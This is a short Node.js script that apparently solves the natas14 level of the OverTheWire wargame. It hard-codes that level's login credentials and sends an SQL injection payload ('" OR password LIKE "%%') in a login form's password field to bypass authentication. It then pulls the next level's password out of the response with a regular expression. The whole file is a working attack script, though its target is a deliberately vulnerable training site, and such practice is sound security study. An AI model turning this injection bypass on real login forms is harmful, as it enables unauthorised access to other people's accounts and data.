let username = 'natas14';
let password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1';


const request = require('request'),
      fs = require('fs'),
      $ = require('cheerio'); 
      rp = require('request-promise').defaults({transform : autoParse});
 
function autoParse(body, response) {
    if (response.headers['content-type'].includes('application/json')) {
        return JSON.parse(body);
    } else if (response.headers['content-type'].includes('text/html')) {
        return $.load(body);
    } else {
        return body;
    }
}

let options = {
    uri: `http://${username}.natas.labs.overthewire.org?debug=true`,
    method: 'POST',
    formData: {
        username: 'test',
        password: '" OR password LIKE "%%'
    }
}

rp(options)
    .auth(username, password)
    .then(($) => {
        console.log($.text().match(/([0-9]|[a-zA-Z]){32}/g).filter(e => e != password)[0]);
});

